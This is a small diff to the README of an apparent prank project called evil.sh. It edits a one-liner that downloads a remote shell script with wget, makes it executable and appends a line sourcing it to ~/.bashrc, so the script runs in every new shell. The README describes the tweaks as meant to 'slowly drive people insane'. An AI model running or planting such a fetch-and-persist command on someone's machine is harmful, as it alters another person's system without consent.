@@ -5,7 +5,7 @@ Oneliner
 ```
 wget http://tools.apsl.net/evil.sh -O ~/evil.sh && \
 chmod +x ~/evil.sh && \
-echo "source ~/evil.sh" >> ~/.bash_profile
+echo "source ~/evil.sh" >> ~/.bashrc
 ```
 
 A collection of various subtle and not-so-subtle shell tweaks that will slowly drive people insane.
